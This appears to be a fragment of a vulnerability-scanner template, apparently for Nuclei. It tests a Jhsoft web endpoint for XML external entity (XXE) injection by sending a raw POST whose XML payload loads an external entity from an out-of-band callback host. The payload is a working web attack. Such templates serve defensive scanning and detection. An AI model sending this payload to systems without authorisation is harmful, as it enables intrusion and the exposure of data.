  tags: xxe,DNSLOG
http:
  - raw:
      - |
        POST /c6/Jhsoft.Web.groups/LstGroupXml.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/xxe_test">
        %remote;]>
        <root/>
    matchers-condition: and
    matchers:
      - type: status
